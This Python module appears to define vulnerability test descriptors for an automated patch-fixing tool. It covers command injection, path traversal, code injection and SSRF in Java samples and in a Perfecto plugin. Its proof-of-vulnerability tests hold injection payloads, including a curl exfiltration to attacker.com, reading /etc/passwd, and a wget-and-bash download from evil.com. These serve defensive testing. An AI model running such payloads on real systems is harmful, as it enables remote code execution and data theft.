# Example vulnerabilities
from typing import List
from .vuln_info import VulnerabilityInfo
from ..core import (
    ConstraintDict,
    SinkDict,
    FlowStepDict,
    PoVTestDict,
)

# Adjust this prefix to match the project layout. Finder will pass repo-relative paths
# in production; the Fixer only ever reads files under REPO_ROOT.
VULN_DIR = "Experiments/vulnerable/"

class CWE_78(VulnerabilityInfo):
    """
    CWE-78: OS Command Injection via Runtime.exec
    File: Experiments/vulnerable/CWE_78.java
    Sink: Runtime.getRuntime().exec(cmd);
    """
    LANGUAGE: str = "Java"
    FUNC_NAME: str = "main"
    CWE: str = "CWE-78"
    VULN_TITLE: str = "Command Injection via Runtime.exec"

    CONSTRAINTS: ConstraintDict = {
        "max_lines": 30,
        "max_hunks": 2,
        "no_new_deps": True,
        "keep_signature": True,
    }

    SINK: SinkDict = {
        "file": f"{VULN_DIR}CWE_78.java",
        "line": 13,                     # Runtime.getRuntime().exec(cmd);
        "symbol": "Runtime.exec",
    }

    FLOW: List[FlowStepDict] = [
        {"file": f"{VULN_DIR}CWE_78.java", "line": 8,  "note": "source: Scanner.nextLine() -> userInput"},
        {"file": f"{VULN_DIR}CWE_78.java", "line": 9,  "note": "propagate: cmd = \"java -version \" + userInput"},
        {"file": f"{VULN_DIR}CWE_78.java", "line": 13, "note": "sink: Runtime.getRuntime().exec(cmd)"},
    ]

    POV_TESTS: List[PoVTestDict] = [
        {
            "name": "semicolon_injection",
            "description": "Injects a second command via ';'",
            "entrypoint": "CWE_78#main",
            "args": ["; touch /tmp/pwned"],
            "env": {},
            "expected": {"should_block": True, "no_side_effect_file": "/tmp/pwned"},
        }
    ]


class CWE_22(VulnerabilityInfo):
    """
    CWE-22: Path Traversal in file deletion
    File: Experiments/vulnerable/CWE_22.java
    Sink: f.delete() guarded by naive path.startsWith("/safe_dir/")
    """
    LANGUAGE: str = "Java"
    FUNC_NAME: str = "main"
    CWE: str = "CWE-22"
    VULN_TITLE: str = "Path Traversal in File Deletion"

    CONSTRAINTS: ConstraintDict = {
        "max_lines": 30,
        "max_hunks": 2,
        "no_new_deps": True,
        "keep_signature": True,
    }

    SINK: SinkDict = {
        "file": f"{VULN_DIR}CWE_22.java",
        "line": 25,                     # f.delete();
        "symbol": "File.delete",
    }

    FLOW: List[FlowStepDict] = [
        {"file": f"{VULN_DIR}CWE_22.java", "line": 22, "note": "source: args[0] -> path"},
        {"file": f"{VULN_DIR}CWE_22.java", "line": 23, "note": "naive guard: path.startsWith(\"/safe_dir/\")"},
        {"file": f"{VULN_DIR}CWE_22.java", "line": 24, "note": "File f = new File(path)"},
        {"file": f"{VULN_DIR}CWE_22.java", "line": 25, "note": "sink: f.delete()"},
    ]

    POV_TESTS: List[PoVTestDict] = [
        {
            "name": "dotdot_escape",
            "description": "Bypasses naive prefix check via ../",
            "entrypoint": "CWE_22#main",
            "args": ["/safe_dir/../important.dat"],
            "env": {},
            "expected": {"should_block": True, "no_delete": "important.dat"},
        }
    ]


class CWE_94(VulnerabilityInfo):
    """
    CWE-94: Code Injection via ScriptEngine.eval
    File: Experiments/vulnerable/CWE_94.java
    Sink: engine.eval(formula)
    """
    LANGUAGE: str = "Java"
    FUNC_NAME: str = "doGet"
    CWE: str = "CWE-94"
    VULN_TITLE: str = "Code Injection via Expression Evaluation"

    CONSTRAINTS: ConstraintDict = {
        "max_lines": 40,
        "max_hunks": 3,
        "no_new_deps": True,
        "keep_signature": True,
    }

    SINK: SinkDict = {
        "file": f"{VULN_DIR}CWE_94.java",
        "line": 22,                     # engine.eval(formula)
        "symbol": "ScriptEngine.eval",
    }

    FLOW: List[FlowStepDict] = [
        {"file": f"{VULN_DIR}CWE_94.java", "line": 15, "note": "source: request.getParameter(\"formula\")"},
        {"file": f"{VULN_DIR}CWE_94.java", "line": 17, "note": "ScriptEngineManager / engine = JavaScript"},
        {"file": f"{VULN_DIR}CWE_94.java", "line": 22, "note": "sink: engine.eval(formula)"},
    ]

    POV_TESTS: List[PoVTestDict] = [
        {
            "name": "evil_formula",
            "description": "Attempts to execute arbitrary code via expression",
            "entrypoint": "CWE_94#doGet",
            "args": [],
            "env": {"QUERY_STRING": "formula=java.lang.Runtime.getRuntime().exec('touch /tmp/pwned')"},
            "expected": {"should_block": True, "no_side_effect_file": "/tmp/pwned"},
        }
    ]


class CWE_918(VulnerabilityInfo):
    """
    CWE-918: SSRF via untrusted host/URL that is base64-decoded and fetched
    File: Experiments/vulnerable/CWE_918.java
    Sink: opening a connection to (decoded) attacker-controlled endpoint
    """
    LANGUAGE: str = "Java"
    FUNC_NAME: str = "fetch"
    CWE: str = "CWE-918"
    VULN_TITLE: str = "SSRF risk via decoded host"

    CONSTRAINTS: ConstraintDict = {
        "max_lines": 40,
        "max_hunks": 3,
        "no_new_deps": True,
        "keep_signature": True,
    }

    # The sink is inside fetch() near where a connection is opened and the input stream is read
    SINK: SinkDict = {
        "file": f"{VULN_DIR}CWE_918.java",
        "line": 41,
        "symbol": "URL.openConnection/getInputStream",
    }

    FLOW: List[FlowStepDict] = [
        {"file": f"{VULN_DIR}CWE_918.java", "line": 8,  "note": "decodeHost(host): if not http*, Base64-decode"},
        {"file": f"{VULN_DIR}CWE_918.java", "line": 20, "note": "encodeHost(host): prepend http:// and Base64-encode"},
        {"file": f"{VULN_DIR}CWE_918.java", "line": 35, "note": "fetch(encodedOrPlain): decoded target used for request"},
        {"file": f"{VULN_DIR}CWE_918.java", "line": 41, "note": "sink: open connection and read from target"},
    ]

    POV_TESTS: List[PoVTestDict] = [
        {
            "name": "metadata_probe",
            "description": "Attempts to reach internal metadata endpoint",
            "entrypoint": "CWE_918#main",
            "args": [],  # uses hardcoded demo flow in main(); adjust if you wire CLI
            "env": {},
            "expected": {"should_block": True, "no_internal_access": True},
        }
    ]


# ===== Example Real-world vulnerabilities =====
class CWE_78_PerfectoCredentials(VulnerabilityInfo):
    """
    CWE-78: OS Command Injection via Launcher.launch with untrusted apiKey
    Files: 
        - Source: src/main/java/io/plugins/perfecto/credentials/PerfectoCredentials.java
        - Sink: src/main/java/io/plugins/perfecto/PerfectoBuildWrapper.java
    
    The apiKey from PerfectoCredentials flows into a command string that is executed
    via launcher.launch().cmds(script.split(" ")). An attacker who can control the
    apiKey value can inject arbitrary commands that will be executed.
    
    Vulnerability chain:
    1. apiKey is retrieved from credentials (line 151)
    2. baseCommand is built using string concatenation with apiKey.trim() (line 160)
    3. script is created by appending pcParameters to baseCommand (line 162)
    4. script.split(" ") is passed to launcher.launch().cmds() (line 164)
    5. Command is executed with attacker-controlled input
    
    The regex validation only checks for certain special characters but does NOT
    prevent command injection via spaces, semicolons in filenames, or path manipulation.
    """
    LANGUAGE: str = "Java"
    FUNC_NAME: str = "setUp"
    CWE: str = "CWE-78"
    VULN_TITLE: str = "Command Injection via Untrusted apiKey in Perfecto Connect Launch"

    CONSTRAINTS: ConstraintDict = {
        "max_lines": 60,
        "max_hunks": 4,
        "no_new_deps": True,
        "keep_signature": True,
    }

    SINK: SinkDict = {
        "file": f"{VULN_DIR}perfecto/PerfectoBuildWrapper.java",
        "line": 164,
        "symbol": "Launcher.launch",
    }

    FLOW: List[FlowStepDict] = [
        {
            "file": f"{VULN_DIR}perfecto/PerfectoCredentials.java",
            "line": 151,
            "note": "source: apiKey retrieved from credentials (potentially user-controlled)",
        },
        {
            "file": f"{VULN_DIR}perfecto/PerfectoBuildWrapper.java",
            "line": 151,
            "note": "apiKey obtained: credentials.getPassword().getPlainText()",
        },
        {
            "file": f"{VULN_DIR}perfecto/PerfectoBuildWrapper.java",
            "line": 160,
            "note": "propagate: baseCommand = pcLocation + ' start -c ' + cloudName + '.perfectomobile.com -s ' + apiKey.trim()",
        },
        {
            "file": f"{VULN_DIR}perfecto/PerfectoBuildWrapper.java",
            "line": 162,
            "note": "propagate: script = baseCommand + ' ' + pcParameters.trim() (apiKey embedded in command string)",
        },
        {
            "file": f"{VULN_DIR}perfecto/PerfectoBuildWrapper.java",
            "line": 164,
            "note": "sink: launcher.launch().cmds(script.split(' ')) - command executed with tainted apiKey",
        },
    ]

    POV_TESTS: List[PoVTestDict] = [
        {
            "name": "space_separated_command_injection",
            "description": "Injects additional command via space-separated args (exploits split(' '))",
            "entrypoint": "PerfectoBuildWrapper#setUp",
            "args": [],
            "env": {
                "apiKey": "validtoken touch /tmp/pwned",
                "cloudName": "mycloud",
                "pcParameters": "",
            },
            "expected": {
                "should_block": True,
                "no_side_effect_file": "/tmp/pwned",
            },
        },
        {
            "name": "semicolon_in_pcParameters",
            "description": "Injects command via pcParameters which is appended to the command",
            "entrypoint": "PerfectoBuildWrapper#setUp",
            "args": [],
            "env": {
                "apiKey": "validtoken",
                "cloudName": "mycloud",
                "pcParameters": "; curl attacker.com/exfil?data=$(whoami)",
            },
            "expected": {
                "should_block": True,
                "no_network_request": "attacker.com",
            },
        },
        {
            "name": "path_traversal_in_pcLocation",
            "description": "Manipulates pcLocation to execute arbitrary binary",
            "entrypoint": "PerfectoBuildWrapper#setUp",
            "args": [],
            "env": {
                "apiKey": "token123",
                "cloudName": "cloud",
                "perfectoConnectLocation": "/tmp/malicious",
                "perfectoConnectFile": "evil.sh",
            },
            "expected": {
                "should_block": True,
                "validate_executable_path": True,
            },
        },
        {
            "name": "command_substitution_in_apiKey",
            "description": "Attempts command substitution using $() in apiKey",
            "entrypoint": "PerfectoBuildWrapper#setUp",
            "args": [],
            "env": {
                "apiKey": "token$(cat /etc/passwd > /tmp/exfil.txt)",
                "cloudName": "mycloud",
                "pcParameters": "",
            },
            "expected": {
                "should_block": True,
                "no_side_effect_file": "/tmp/exfil.txt",
            },
        },
        {
            "name": "backtick_substitution_cloudName",
            "description": "Attempts backtick command substitution in cloudName",
            "entrypoint": "PerfectoBuildWrapper#setUp",
            "args": [],
            "env": {
                "apiKey": "validtoken",
                "cloudName": "test`id > /tmp/id.txt`",
                "pcParameters": "",
            },
            "expected": {
                "should_block": True,
                "no_side_effect_file": "/tmp/id.txt",
            },
        },
        {
            "name": "multiple_commands_via_ampersand",
            "description": "Chains commands using && in apiKey",
            "entrypoint": "PerfectoBuildWrapper#setUp",
            "args": [],
            "env": {
                "apiKey": "token && wget http://evil.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh",
                "cloudName": "cloud",
                "pcParameters": "",
            },
            "expected": {
                "should_block": True,
                "no_side_effect_file": "/tmp/s.sh",
                "no_network_request": "evil.com",
            },
        },
    ]